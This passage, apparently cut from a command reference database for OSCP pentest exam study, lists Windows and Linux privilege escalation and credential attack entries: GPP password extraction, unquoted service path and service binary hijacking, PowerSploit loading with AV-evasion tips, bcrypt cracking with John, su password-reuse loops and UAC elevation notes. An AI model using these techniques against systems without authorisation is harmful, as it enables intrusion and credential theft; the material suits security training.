Tasks in C:\Users\<user>\AppData, tasks with environment variable paths (%TEMP%), tasks with relative paths.

Get task details:
Get-ScheduledTask -TaskName <name> | Select-Object -ExpandProperty Actions.

Manual alternative:
schtasks /query /fo LIST /v","high","","","","{""Cmdlet not found"": ""Requires PowerShell 4.0+. Use schtasks /query /fo LIST /v"", ""Too much output"": ""Filter: Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq 'SYSTEM'}"", ""Need task details"": ""Get-ScheduledTaskInfo -TaskName <name> for runtime info""}","{""-TaskName"": ""Filter to specific task name"", ""-TaskPath"": ""Filter by task path (e.g., \\Microsoft\\Windows\\)""}","[""evil-winrm-shell""]","[""windows-scheduled-tasks"", ""get-scheduledtask""]","[""windows-scheduled-tasks""]"
"get-gpppassword","Get Group Policy Preferences Password","exploitation","Get-GPPPassword","Extract and decrypt passwords from Group Policy Preferences (GPP) XML files stored in SYSVOL. GPP allows setting local admin passwords via Group Policy, but stores them with known AES key. This PowerSploit/PowerUp function finds and decrypts these passwords automatically.","","","OSCP Critical:
GPP vulnerability (MS14-025 patched but files remain).

Searches \\<domain>\SYSVOL\<domain>\Policies for Groups.xml containing cpassword attribute.

AES key is publicly known (same for all domains).

Manual alternative:
Search SYSVOL for cpassword, decrypt with gpp-decrypt or Python script.

Modern domains may not use GPP passwords, but legacy configs remain.

Works from any domain user context.","high","","","","{""Function not found"": ""Import-Module PowerSploit or PowerUp first"", ""No passwords found"": ""Domain may not use GPP or already patched Groups.xml files"", ""Access denied"": ""Verify domain user access to SYSVOL: dir \\\\<domain>\\SYSVOL""}","","[""import-powersploit""]","","[""windows-hashcat-crack-ntlm"", ""ad-pass-the-hash-impacket-psexec""]"
"get-unquotedservice","Get Unquoted Service Paths","enumeration","Get-ServiceUnquoted","Identify Windows services with unquoted executable paths containing spaces. PowerUp function that finds services vulnerable to path hijacking privilege escalation. When service path is unquoted with spaces, Windows attempts to execute from multiple locations, allowing DLL/binary hijacking.","","","OSCP PrivEsc Gold:
Unquoted service paths are common Windows privilege escalation vector.

Example:
Path 'C:\Program Files\Vulnerable App\service.exe' without quotes tries 'C:\Program.exe', 'C:\Program Files\Vulnerable.exe' before correct path.

Place malicious binary in intermediate path with write access.

Requires service restart (manual or automatic).

Check writable directories:
icacls 'C:\Program Files'.

PowerUp's Invoke-AllChecks includes this check.

Manual alternative:
wmic service get name,pathname | findstr /i /v ""C:\Windows"" | findstr /i /v ""\""""","high","","","","{""Function not found"": ""Import-Module PowerUp.ps1 first"", ""No results"": ""System may be properly configured with quoted paths"", ""Can't exploit"": ""Check directory permissions with Get-Acl or icacls""}","","[""import-powerup""]","[""win-sc-query-services""]","[""get-acl""]"
"get-modifiableservicefile","Get Modifiable Service Binaries","enumeration","Get-ModifiableServiceFile","Identify Windows services with binaries or configuration files that current user can modify. PowerUp function that checks file permissions on service executables, DLLs, and config files. Direct privilege escalation by replacing service binary with malicious executable.","","","OSCP PrivEsc Critical:
Service binary hijacking is reliable privilege escalation.

If service runs as SYSTEM and current user can overwrite binary, replace with reverse shell or local admin creation payload.

Always backup original binary first.

Check if service auto-starts or requires manual restart.

PowerUp's Install-ServiceBinary automates exploitation.

Verify permissions:
icacls <path> | findstr /i ""Users Everyone Authenticated"".

Manual alternative:
for /f %i in ('sc query state^= all^| findstr SERVICE_NAME') do @echo %i && icacls ""%i""","high","","","","{""Function not found"": ""Import-Module PowerUp.ps1 first"", ""No results"": ""Current user lacks write permissions on any service files"", ""False positives"": ""Verify with icacls: icacls <path> (check for (M) or (F) permissions)""}","","[""import-powerup""]","","[""get-acl""]"
"import-module-activedirectory","Import Active Directory Module","enumeration","Import-Module ActiveDirectory","Load Microsoft Active Directory PowerShell module to enable native AD cmdlets (Get-ADUser, Get-ADGroup, Get-ADComputer, etc.). Part of Remote Server Administration Tools (RSAT). Required for native AD enumeration without PowerView.","","","OSCP Note:
RSAT is less common than PowerView on target systems but provides native Microsoft cmdlets.

On Windows Server:
Install-WindowsFeature RSAT-AD-PowerShell.

On Windows 10:
Install via Settings > Apps > Optional Features > RSAT:
Active Directory Domain Services.

Alternative if unavailable:
Use PowerView (Import-Module PowerView.ps1) or native tools (net user, net group, nltest).","high","","","","{""Module not found (Server)"": ""Install-WindowsFeature RSAT-AD-PowerShell"", ""Module not found (Desktop)"": ""Install RSAT from Windows Features or Microsoft Download"", ""Execution policy"": ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass""}","","","[""import-powerview""]","[""get-aduser"", ""get-adgroup"", ""get-adcomputer""]"
"import-powerup","Import PowerUp Module","enumeration","Import-Module <PATH>\PowerUp.ps1","Load PowerUp privilege escalation framework into PowerShell session. PowerUp is a PowerShell tool for Windows local privilege escalation checks including service misconfigurations, unquoted paths, AlwaysInstallElevated, DLL hijacking, and more.","","Import-Module C:\Tools\PowerUp.ps1","OSCP Essential:
PowerUp automates Windows privilege escalation checks.

Key functions:
Invoke-AllChecks (run all checks), Get-ServiceUnquoted (unquoted service paths), Get-ModifiableServiceFile (writable service binaries), Get-ModifiableRegistryAutoRun (hijackable autoruns).

PowerUp.ps1 may trigger AV - consider obfuscation.

Alternative:
Use WinPEAS (compiled binary) or manual checks.

Part of PowerSploit framework.","high","","","","{""execution policy blocked"": ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass"", ""file not found"": ""Verify PowerUp.ps1 path and use full absolute path"", ""access denied"": ""Ensure current user has read permissions on file""}","","","","[""get-unquotedservice"", ""get-modifiableservicefile""]"
"import-powersploit","Import PowerSploit Module","exploitation","Import-Module <PATH>\PowerSploit.psd1","Load PowerSploit offensive PowerShell framework. PowerSploit includes multiple modules: Privesc (PowerUp), Recon (PowerView), Exfiltration, Persistence, ScriptModification, and CodeExecution. Comprehensive post-exploitation toolkit for Windows.","","Import-Module C:\Tools\PowerSploit\PowerSploit.psd1","OSCP Context:
PowerSploit provides comprehensive toolkit but individual modules (PowerView, PowerUp) are more commonly used separately.

Loading full framework increases detection risk.

For OSCP, prefer targeted module imports:
PowerView for AD recon, PowerUp for privesc.

PowerSploit includes Get-GPPPassword (Privesc module).

May trigger AV/EDR - consider loading modules individually or using obfuscation.","high","","","","{""manifest not found"": ""Use Import-Module <PATH>\\PowerSploit.psm1 instead"", ""execution policy"": ""Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass"", ""individual module preferred"": ""Import-Module <PATH>\\Recon\\PowerView.ps1 for just PowerView""}","","","[""import-powerview"", ""import-powerup""]",""
"get-process","Get Running Processes","enumeration","Get-Process","Enumerate all running processes on local or remote system. Native PowerShell cmdlet that returns process objects with detailed information including process name, ID, CPU usage, memory, and executable path.","","","OSCP Usage:
Quick process enumeration to identify targets and avoid AV.

Look for AV processes (MsMpEng.exe, AVP.exe, etc.) before running exploits.

Get-Process doesn't show process owner by default - use Get-CimInstance Win32_Process for owner information.

For full process command line:
Get-CimInstance Win32_Process | Select-Object Name,CommandLine.

Faster than Get-CimInstance for basic enumeration.","medium","","","","{""Missing Path"": ""Get-Process | Select-Object Name,Id,Path (Path not shown by default)"", ""Access denied on remote"": ""Requires PS Remoting and admin access"", ""Need owner/user"": ""Use Get-CimInstance Win32_Process | Select-Object Name,ProcessId,@{n='Owner';e={$_.GetOwner().User}}""}","{""-Name"": ""Filter by process name (e.g., -Name explorer)"", ""-Id"": ""Filter by PID"", ""-ComputerName"": ""Query remote computer (requires PS Remoting)""}","","",""
"get-service","Get Windows Services","enumeration","Get-Service","Enumerate Windows services on local or remote system. Native PowerShell cmdlet that returns service objects with name, display name, and status. Critical for identifying vulnerable services and privilege escalation vectors.","","","OSCP PrivEsc:
Get-Service shows basic service info.

For privilege escalation, need binary path and service account - use Get-CimInstance Win32_Service or sc qc <service>.

Key properties for privesc:
PathName (unquoted paths, writable binaries), StartName (services running as SYSTEM).

Check service permissions:
sc sdshow <service> or accesschk -ucqv <service>.

Faster than WMI for basic service status checks.","high","","","","{""Missing binary path"": ""Get-CimInstance Win32_Service | Select-Object Name,PathName,StartName for full details"", ""Need service account"": ""Get-CimInstance Win32_Service | Select-Object Name,StartName"", ""Remote access denied"": ""Requires admin access on remote system""}","{""-Name"": ""Filter by service name"", ""-DisplayName"": ""Filter by display name"", ""-ComputerName"": ""Query remote computer""}","[""evil-winrm-shell""]","[""get-service"", ""systemctl-running-services""]","[""windows-unquoted-service""]"
"get-hotfix","Get Installed Hotfixes","enumeration","Get-HotFix","Enumerate installed Windows updates and security patches. Native PowerShell cmdlet that queries installed hotfixes, useful for identifying missing patches and potential kernel exploits.","","","OSCP Kernel Exploits:
Compare installed patches against known exploits.

Key missing patches to check:
MS16-032, MS15-051, MS10-059.

For comprehensive patch analysis, combine with systeminfo output and use Windows-Exploit-Suggester.

Get-HotFix may not show all patches - wmic qfe is more comprehensive.

Check specific patch:
Get-HotFix -Id KB4012215.

Manual alternative:
wmic qfe get Caption,Description,HotFixID,InstalledOn","medium","","","","{""Incomplete list"": ""Get-HotFix may miss some updates - use wmic qfe list for comprehensive list"", ""Slow query"": ""Normal on systems with many patches"", ""Compare with exploits"": ""Use Watson or Sherlock tools for automated CVE matching""}","{""-Id"": ""Filter by specific KB number (e.g., -Id KB4012215)"", ""-Description"": ""Filter by update type""}","","",""
"john-crack-bcrypt","John Crack Bcrypt Hashes","post-exploit","john --format=bcrypt --wordlist=<WORDLIST> <HASH_FILE>","Crack bcrypt password hashes extracted from web applications (Laravel, Django, etc.) using John the Ripper","password-cracking","john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt bcrypt_hashes.txt","CRITICAL OSCP WEB EXPLOITATION: Bcrypt hashes commonly found in web app databases.

Bcrypt hash format:
$2y$10$abcdefghijklmnopqrstuv0123456789ABCDEFGHIJK
                         
     22-char salt       31-char hash (base64)
    Cost factor (2^10 = 1024 rounds)
   Minor version (a, b, y)
 Bcrypt identifier

Cost factor impact (exponential):
Cost  Rounds    Speed
04    16        ~10,000/sec
10    1,024     ~100/sec
12    4,096     ~25/sec
14    16,384    ~6/sec

OSCP workflow for web app exploitation:
1. SQL injection  Dump users table
   sqlmap -r request.txt -p param --dump -D database -T users

2. Extract bcrypt hashes
   Look for $2y$, $2a$, $2b$ in password column
   Save to file: echo '$2y$10$...' > hashes.txt

3. Crack with John (THIS COMMAND)
   john --format=bcrypt --wordlist=rockyou.txt hashes.txt

4. Test credentials
   a. Web admin panel login
   b. SSH: ssh user@target
   c. su: su - user

5. Document in breakthrough.md

Bcrypt vs other hash types:
(1) MD5/SHA1 - FAST (millions/sec)  Easy to crack
(2) bcrypt - SLOW (hundreds/sec)  Hard to crack, better security
(3) NTLM - FAST (billions/sec with GPU)  Very weak
(4) SHA-512 (Linux shadow) - MEDIUM (thousands/sec)

Time estimates (rockyou.txt, cost $10):
- John (CPU): 40-50 hours for full rockyou.txt
- Hashcat (GPU): 4-5 hours for full rockyou.txt
- Common passwords: 5-30 minutes

Optimization strategies:
(1) Use smaller targeted wordlist first
    Common passwords: /usr/share/wordlists/fasttrack.txt
    Top 10k: head -10000 rockyou.txt > top10k.txt

(2) Use rules for mutations
    john --format=bcrypt --wordlist=top10k.txt --rules=best64 hashes.txt

(3) Switch to hashcat with GPU
    hashcat -m 3200 -a 0 hashes.txt rockyou.txt -O

(4) Check pot file periodically
    john --show --format=bcrypt hashes.txt

Common bcrypt sources in OSCP:
- Laravel: users table, password column ($2y$10$...)
- WordPress: wp_users table, user_pass column ($P$... = phpass, not bcrypt)
- Django: auth_user table, password column (bcrypt$...)
- Flask: users table, password_hash column

Extracting hashes from SQLMap output:
# SQLMap CSV format
grep '$2y$' ~/.local/share/sqlmap/output/*/dump/*/users.csv | cut -d',' -f3 > hashes.txt

# Or from manual SQL injection
UNION SELECT username,password FROM users WHERE password LIKE '$2y$%'

Checking already cracked:
john --show --format=bcrypt hashes.txt
Output: username:cracked_password:...

Manual verification:
# Verify hash format
echo 'test_password' | htpasswd -nBC 10 test | cut -d':' -f2
# Should produce $2y$10$... format

# Test cracked password immediately
ssh admin@target  # Try cracked password
su - admin        # From existing shell

OSCP exam tip: Start bcrypt cracking EARLY (background process). Use small wordlist first (top 10k rockyou). If no success in 15 minutes, move on and let it run in background (tmux/screen). Check back periodically. Document in failed_attempts.md if unsuccessful.

Time estimate:
- Setup: 1-2 minutes
- Cracking: 5 minutes - 50 hours (depends on password complexity and cost)
- Common passwords: 5-30 minutes success rate ~30%
","high","","","","{""unknown_format"": ""Verify hash format. Bcrypt starts with $2a$, $2b$, or $2y$. Check with: head -1 <HASH_FILE>. If different format, use john --list=formats | grep -i <type>"", ""no_hashes_loaded"": ""Hash file format incorrect. John expects: hash or username:hash (one per line). Remove any headers, quotes, or extra formatting. Test: echo '$2y$10$abcdefghijklmnopqrstuv0123456789ABCDEFGHIJK' > test.txt && john --format=bcrypt test.txt"", ""too_slow"": ""Bcrypt is VERY slow by design (cost factor). Cost $10 = ~100 hashes/sec, Cost $12 = ~25 hashes/sec. Use smaller wordlist first. Or use hashcat with GPU (100x faster). Check cost: second field after $2y$ (e.g., $2y$10$ = cost 10)"", ""session_interrupted"": ""Resume with: john --restore. John saves progress in ~/.john/john.rec. Check cracked passwords so far: john --show --format=bcrypt <HASH_FILE>""}","{""--format=bcrypt"": ""Specify hash format as bcrypt - CRITICAL for bcrypt hashes. Without this, John may misdetect hash type. Bcrypt format: $2a$, $2b$, $2y$ (algorithm identifier) + cost factor + 22-char salt + 31-char hash. Very slow by design (defense against brute force)"", ""--wordlist"": ""Dictionary attack mode using specified wordlist - tests each word from wordlist against hash. For OSCP, use rockyou.txt (14M passwords). Faster than brute force but limited to wordlist contents""}","[""sqlmap-dump-table""]","","[""ssh-connect-password"", ""su-user-switch"", ""web-login-admin-panel""]"
"file-identify-type","Identify File Type","post-exploit","file <FILE>","Identify file type by examining file headers and magic bytes, bypassing file extension to determine actual content type","file-utilities","file suspicious_file","CRITICAL OSCP SKILL: Files without extensions or with wrong extensions are common in CTFs.

Common OSCP scenarios:
(1) Executable without .exe extension
    file suspicious_file  ELF 64-bit LSB executable
     chmod +x suspicious_file && ./suspicious_file

(2) Image file with wrong extension
    file backup.txt  PNG image data
     mv backup.txt backup.png && open backup.png

(3) Compressed archive disguised
    file data  gzip compressed data
     mv data data.gz && gunzip data.gz

(4) Script with no extension
    file script  Python script, ASCII text
     python3 script

(5) Database file
    file db  SQLite 3.x database
     sqlite3 db

File type identification workflow:
1. List files: ls -la
2. Identify type (THIS COMMAND): file *
3. Rename if needed: mv file.txt file.png
4. Process accordingly:
   - Executables: chmod +x, run with ./ or analyze
   - Archives: extract with tar/unzip/gunzip
   - Images: view or check for steganography
   - Text: cat/less to read
   - Databases: sqlite3/strings to examine

Magic bytes (file signatures):
ELF:    7F 45 4C 46                 (Linux executable)
PE:     4D 5A                       (Windows .exe)
PNG:    89 50 4E 47                 (PNG image)
JPEG:   FF D8 FF                    (JPEG image)
PDF:    25 50 44 46                 (%PDF)
ZIP:    50 4B 03 04                 (ZIP archive)
GZIP:   1F 8B                       (gzip compressed)
TAR:    75 73 74 61 72              (tar archive)
SQLite: 53 51 4C 69 74 65           (SQLite database)

File command output interpretation:
ELF 64-bit LSB executable, x86-64, dynamically linked
                                 Linking type
                        Architecture
          Byte order (LSB=little-endian)
    Bit width
 File format (Executable and Linkable Format)

Manual verification:
# Check magic bytes directly
xxd <FILE> | head -1
# First 16 bytes show file signature

# Multiple files
file * | grep -v directory

# Recursive
find . -type f -exec file {} \; | grep -v directory

Advanced analysis:
# Check for hidden data (steganography)
binwalk <FILE>
strings <FILE>
exiftool <FILE>

# Check encoding
file -i <FILE>  # Shows MIME type and charset

# Check architecture compatibility
file binary | grep -o 'x86-64\|ARM\|i386'

OSCP exam scenarios:
(1) Found file in web directory without extension
     file identifies as ELF executable
     Download, chmod +x, run for privesc

(2) Backup file with .txt extension
     file reveals gzip compressed
     Extract with gunzip for credentials

(3) Image upload bypass verification
     Upload PHP shell as image.jpg
     file image.jpg shows: PHP script, ASCII text
     Proves upload filter only checks extension

(4) Binary analysis for reversing
     file binary shows architecture and linking
     Helps choose correct decompiler/debugger

Quick reference:
file <FILE>           - Basic type identification
file -b <FILE>        - Brief output (no filename)
file -i <FILE>        - MIME type and encoding
file -z <FILE>        - Look inside compressed files
file -L <FILE>        - Follow symlinks

OSCP exam tip: ALWAYS run 'file' on unknown files before attempting to use them. Saves time trying to execute images or decompress executables. Common pattern: find . -type f -exec file {} \; | grep -i 'executable\|archive\|image'.

Time estimate: <5 seconds per file","high","","","","{""permission_denied"": ""Can't read file. Check permissions: ls -la <FILE>. May need to copy to /tmp first"", ""shows_data"": ""File type unknown to magic database. Check hex: xxd <FILE> | head. Search magic bytes online"", ""wrong_type_reported"": ""File may be corrupted or intentionally obfuscated. Verify with hex dump: xxd <FILE> | head -20""}","","","","[""chmod-executable"", ""file-rename-extension""]"
"su-user-switch","Switch User with su","post-exploit","su - <USER>","Switch to another user account with password for lateral movement or privilege escalation to root","privilege-escalation","su - admin","CRITICAL OSCP LATERAL MOVEMENT: Password reuse across user accounts is common.

su command variations:
su              - Switch to root (requires root password)
su -            - Switch to root with login environment
su <USER>       - Switch to <USER> (keeps current environment)
su - <USER>     - Switch to <USER> with login environment (RECOMMENDED)

Login environment (-) vs current environment:
WITH hyphen (su - user):
- HOME=/home/user
- PATH=/usr/local/bin:/usr/bin:/bin
- SHELL=/bin/bash
- PWD=/home/user
- All user's login scripts run (.bashrc, .profile)

WITHOUT hyphen (su user):
- HOME=/root (old value)
- PATH=/usr/sbin:/usr/bin (old value)
- SHELL=/bin/bash (old value)
- PWD=/root (old value)
- May cause permission errors, missing commands

OSCP workflow for password reuse:
1. Gain initial foothold (web shell, RCE)
2. Enumerate users: cat /etc/passwd | grep /bin/bash
3. Extract credentials:
   a. SQLi dump: sqlmap --dump -T users
   b. Config files: grep -r 'password' /var/www/
   c. Crack hashes: john --format=bcrypt hashes.txt
4. Test credentials with su (THIS COMMAND)
5. Escalate to root if user has sudo

Common OSCP scenarios:
(1) Web admin password works for SSH user
    su - admin
    Password: WebAdminPass123
     Lateral movement successful

(2) Database credentials work for user account
    su - dbuser
    Password: db_password_123
     Access to user with sudo rights

(3) Cracked hash enables root access
    su -
    Password: cracked_from_shadow
     Root shell obtained

(4) Password found in config file
    cat /var/www/config.php  password: 'SecretPass123'
    su - www-data
    Password: SecretPass123

Password testing strategy:
# Test single password against all users
for user in $(cut -d: -f1 /etc/passwd | grep -v 'nologin\|false\|sync'); do
  echo ""Testing $user""
  echo 'password123' | su - $user -c 'whoami' 2>/dev/null && echo ""SUCCESS: $user""
done

# Test multiple passwords for specific user
while IFS= read -r pass; do
  echo ""Testing: $pass""
  echo ""$pass"" | su - admin -c 'whoami' 2>/dev/null && echo ""SUCCESS: $pass"" && break
done < passwords.txt

su vs sudo:
su - <USER>:
- Requires target user's password
- Full login shell as target user
- No audit trail
- Used for: Lateral movement, root access

sudo -u <USER> <COMMAND>:
- Requires YOUR password (current user)
- Runs single command as target user
- Logged in /var/log/auth.log
- Used for: Temporary privilege escalation

sudo su - <USER>:
- Requires YOUR password
- Switches to target user via sudo
- Useful when you know YOUR password but not target's

Verification after su:
whoami           - Confirm current user
id               - Show UID, GID, groups
echo $HOME       - Verify home directory changed
echo $USER       - Verify USER variable
pwd              - Current working directory
sudo -l          - Check new user's sudo rights

OSCP privilege escalation with su:
1. Find user with sudo rights:
   grep -E '^[^#]*sudo' /etc/group
    Lists users in sudo group

2. Switch to that user:
   su - sudo_user
   Password: found_password

3. Escalate to root:
   sudo su -
    Root shell

Advanced flags:
-c <COMMAND>  - Run single command as user
-s <SHELL>    - Use specific shell instead of user's default
-l            - Simulate full login (same as hyphen)
-m            - Preserve environment (opposite of hyphen)

OSCP exam tip: ALWAYS test found credentials with su immediately. Test against all enumerated users (password reuse). Document all working credentials in credentials.txt. If su succeeds, check sudo -l for privilege escalation path.

Time estimate: 30 seconds (successful) + 2-5 minutes (testing multiple users/passwords)","high","","","","{""authentication_failure"": ""Password incorrect. Verify password from credential dump. Try password variations (uppercase, special chars). Check if user account locked: passwd -S <USER>"", ""user_not_exist"": ""Username typo or user doesn't exist. Check /etc/passwd: grep <USER> /etc/passwd. List valid users: cut -d: -f1 /etc/passwd"", ""no_password_prompt"": ""su requires password for non-root users. If no prompt, check if user has no password set (security issue): sudo grep <USER> /etc/shadow | cut -d: -f2"", ""environment_broken"": ""Missing hyphen (-) causes environment issues. Always use 'su - <USER>' not just 'su <USER>'. Check environment: echo $HOME $PATH $SHELL"", ""stuck_in_su_shell"": ""Exit with: exit or Ctrl+D. Don't nest too many su shells (confusing). Check current user: whoami""}","{""-"": ""Login shell - Provides full login environment (PATH, HOME, SHELL, etc.) as if user logged in directly. Without hyphen, retains current environment which may cause permission issues or missing binaries. ALWAYS use hyphen for clean environment""}","[""john-crack-bcrypt"", ""sqlmap-dump-table""]","","[""check-sudo-privs"", ""linux-enumerate-users"", ""capture-user-flag""]"
"powershell-runas-basic","PowerShell - Manual UAC Elevation (Basic)","post-exploit","powershell -Command ""Start-Process powershell -Verb RunAs""","Launch new PowerShell window as administrator with UAC prompt (requires GUI interaction)","windows","","EDUCATIONAL CONTEXT:
This technique requires MANUAL INTERACTION - user must click 'Yes' on UAC prompt. NOT suitable for:
- OSCP exam (no GUI interaction on reverse shells)
- Automated exploitation scripts
- Remote command execution via WinRM/SSH
- Situations where stealth is required (UAC prompt is visible)

WHY THIS EXISTS:
Legitimate administrative workflow for interactive sessions (RDP, physical console). When admin user needs elevated privileges but launched PowerShell as standard user.

UAC PROMPT BEHAVIOR:
1. User in Admins group + UAC enabled = Consent prompt ('Yes/No')
2. Standard user + UAC enabled = Credential prompt (username/password required)
3. UAC disabled = Process spawns elevated without prompt

WHEN TO USE:
- RDP session as admin user, need elevated PowerShell
- Physical console access, testing admin workflows
- Social engineering scenarios (convince user to click 'Yes')
- Legitimate sysadmin tasks in controlled environment

WHEN NOT TO USE (OSCP):
- Reverse shell from web exploit (no GUI)
- WinRM remote command execution (non-interactive)
- SSH shell access (no Windows desktop)
- Any scenario requiring stealth (UAC prompt visible to user/defender)

ALTERNATIVES FOR OSCP:
- UAC bypass (fodhelper, eventvwr) - No prompt, works in reverse shells
- Exploit service misconfigurations - No user interaction
- Token impersonation (JuicyPotato) - If SeImpersonate privilege available
- Credential reuse with runas /savecred - If admin cached credentials

HOW UAC WORKS:
1. Process requests elevation via '-Verb RunAs'
2. Windows displays consent.exe (UAC prompt on Secure Desktop)
3. User clicks Yes  Process spawns with High integrity token
4. User clicks No  Process never spawns, error returned
5. Consent dialog times out (default 150 seconds)  Denied

BEHIND THE SCENES:
- Consent.exe runs on Secure Desktop (separate desktop session, prevents screen scraping)
- Event ID 4688 logged (process creation with elevated token)
- Parent process ID changes (new elevated process not child of current shell)
- Token type changes: Filtered Admin Token  Full Admin Token

INTEGRITY LEVELS:
Before RunAs: Medium Mandatory Level (filtered admin token)
After RunAs (Yes clicked): High Mandatory Level (full admin token)

TIME ESTIMATE:
10-15 seconds (including user clicking prompt)

EXAM TIP:
DO NOT attempt this on OSCP exam. You cannot interact with UAC prompts on target machines. Use:
1. UAC bypass if user in Admins group
2. Service exploitation if no admin access
3. Kernel exploits as last resort

MANUAL ALTERNATIVE:
Right-click PowerShell icon  'Run as Administrator' (same UAC prompt)

VERIFICATION:
Before: whoami /groups | findstr 'Mandatory'
   Mandatory Label\Medium Mandatory Level
After: whoami /groups | findstr 'Mandatory'
   Mandatory Label\High Mandatory Level","low","","","","{""No UAC prompt appears"": ""Check UAC is enabled: (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System).EnableLUA -eq 1. If 0, UAC disabled (process spawns elevated automatically)."", ""Credentials requested instead of consent"": ""User not in local Administrators group. Must provide admin username/password. Use -Credential parameter: Start-Process powershell -Verb RunAs -Credential (Get-Credential)"", ""Cannot interact with UAC from reverse shell"": ""Use UAC bypass techniques instead: fodhelper-uac-bypass, eventvwr-uac-bypass. RunAs requires physical/GUI access."", ""Process spawns but not elevated"": ""User clicked 'No' or UAC denied. Check Event Viewer Application log for consent failures."", ""Works on RDP but not WinRM"": ""WinRM is non-interactive session - no desktop to show UAC prompt. Use Invoke-Command with CredSSP delegation if needed.""}","{""-Command"": ""Execute PowerShell command string (alternative: -c)"", ""Start-Process"": ""Starts one or more processes on local computer - similar to Unix exec but with elevation support"", ""powershell"": ""Target process to start - can be any executable (cmd.exe, notepad.exe, etc.)"", ""-Verb RunAs"": ""Requests administrative privileges via UAC prompt - equivalent to 'Run as Administrator' right-click"", ""-WindowStyle Hidden"": ""Optional: Hide the window during execution (Normal|Minimized|Maximized|Hidden)"", ""-Wait"": ""Optional: Wait for process to complete before returning control"", ""-NoNewWindow"": ""Optional: Run in same console window (doesn't work with -Verb RunAs)""}","","[""fodhelper-uac-bypass"", ""eventvwr-uac-bypass""]",""
"powershell-runas-output-redirect","PowerShell - UAC Elevation with Output Redirect","post-exploit","powershell -Command ""Start-Process powershell -Verb RunAs -ArgumentList '-Command','Get-Process > C:\temp\output.txt'""","Execute elevated PowerShell command with output redirected to file (requires UAC prompt approval)","windows","","EDUCATIONAL CONTEXT:
This pattern attempts to work around the limitation that you can't directly capture output from elevated processes in a non-elevated shell.

WHY OUTPUT REDIRECT NEEDED:
Elevated process spawns in new window with new console. Output from elevated commands not visible in your current shell. File redirection bridges this gap.

WORKFLOW:
1. Current shell (Medium integrity) runs Start-Process
2. UAC prompt appears, user clicks 'Yes'
3. New PowerShell window spawns (High integrity)
4. Command executes in elevated context
5. Output written to file (accessible from both integrity levels)
6. Elevated window closes automatically
7. Original shell reads output file

COMMON USE CASE:
You have RDP access as admin user but PowerShell opened without elevation. Need to run Get-Service but capture output without opening new window and copy-pasting.

OSCP REALITY CHECK:
This technique is USELESS for exam because:
- No GUI on reverse shells
- Can't click UAC prompts remotely
- Automated exploitation required
- File I/O slower than direct output

BETTER ALTERNATIVES FOR OSCP:
1. UAC Bypass (no prompt):
   fodhelper-uac-bypass with reverse shell payload
2. Service Exploitation:
   If you can modify service, run commands as SYSTEM
3. Scheduled Tasks:
   Create task running as SYSTEM, wait for execution
4. Token Impersonation:
   JuicyPotato/PrintSpoofer if SeImpersonate available

FILE LOCATION CONSIDERATIONS:
Writable even from Medium integrity:
- C:\temp (if exists)
- C:\Users\<username>\AppData\Local\Temp
- C:\Users\Public

Require elevation even for admin users:
- C:\Windows\System32 (SYSTEM only)
- C:\Program Files (most locations)
- Registry hives (HKLM requires elevation)

WHY THIS PATTERN EXISTS:
Legitimate sysadmin workflow: Need one-off elevated command output without keeping elevated window open. Quick privilege check without persistent elevated shell.

READING OUTPUT:
Immediate read (may fail if process still running):
  type C:\temp\output.txt

Wait for completion:
  Start-Process ... -Wait -ArgumentList ...
  type C:\temp\output.txt

PowerShell monitoring:
  while (!(Test-Path C:\temp\output.txt)) { Start-Sleep 1 }
  Get-Content C:\temp\output.txt

PROCESS MONITORING:
With -PassThru flag:
  $proc = Start-Process ... -PassThru
  Wait-Process -Id $proc.Id
  Get-Content C:\temp\output.txt

SECURITY IMPLICATIONS:
- Output file readable by Medium integrity processes
- Sensitive data (password hashes) exposed in cleartext file
- File persists after execution (forensic artifact)
- Always clean up: Remove-Item C:\temp\output.txt -Force

COMMAND ESCAPING:
Nested quotes require careful escaping:
  Wrong: -ArgumentList '-Command','Get-Process | Where {$_.CPU -gt 10}'
  Right: -ArgumentList '-Command',""Get-Process | Where {`$_.CPU -gt 10}""

Backtick (`) escapes special characters in double quotes.

TIME ESTIMATE:
15-20 seconds (UAC prompt + file I/O + reading output)

EXAM TIP:
If you find yourself trying to use this on OSCP exam, STOP. You're approaching the problem wrong. Reverse shells can't interact with UAC. Use exploitation or bypass techniques instead.

MANUAL ALTERNATIVE:
1. Right-click PowerShell  Run as Administrator
2. Run command manually
3. Copy output from console
(Same UAC prompt, more steps)","low","","","","{""Output file not created"": ""1) Verify user clicked 'Yes' on UAC prompt. 2) Check parent directory exists (mkdir C:\\temp first). 3) Test file path is writable: Test-Path -Path C:\\temp -PathType Container"", ""Empty output file created"": ""Command executed but no output generated. Check command syntax is correct. Try simpler command: 'whoami > C:\\temp\\test.txt'"", ""Access denied on output file"": ""Even elevated processes can't write to some locations (Windows\\System32 for non-SYSTEM). Use C:\\temp, C:\\Users\\Public, or user's home directory."", ""Process spawns but output not captured"": ""Timing issue - process completes before file written. Add -Wait flag to Start-Process: -Wait -ArgumentList ..."", ""Cannot read output in current shell"": ""New process runs in separate window. Output goes to file, not current console. Read file after: Get-Content C:\\temp\\output.txt""}","{""-ArgumentList"": ""Array of arguments passed to new PowerShell process. Use comma-separated strings for multiple arguments."", ""'-Command'"": ""First argument: tells new PowerShell to execute a command (alternative: -File for scripts)"", ""'<COMMAND> > <FILE>'"": ""Second argument: actual command with output redirection. Single quotes prevent expansion in current shell."", ""-Wait"": ""Optional: Wait for elevated process to complete before continuing (useful when reading output file immediately after)"", ""-PassThru"": ""Optional: Return Process object for the spawned process (allows monitoring PID, exit code)""}","","[""fodhelper-uac-bypass"", ""eventvwr-uac-bypass"", ""powershell-runas-keepopen""]",""
"powershell-runas-keepopen","PowerShell - UAC Elevation (Keep Window Open)","post-exploit","powershell -Command ""Start-Process powershell -Verb RunAs -ArgumentList '-NoExit','-Command','cd C:\\'""","Launch elevated PowerShell window that stays open for interactive use (requires UAC prompt)","windows","","EDUCATIONAL CONTEXT:
Most common legitimate use of Start-Process -Verb RunAs. Opens persistent elevated PowerShell for interactive administrative work.

WHY -NoExit NEEDED:
Default PowerShell behavior: Execute command, then close window immediately. -NoExit keeps window open for continued interactive use.

ARGUMENT ORDER MATTERS:
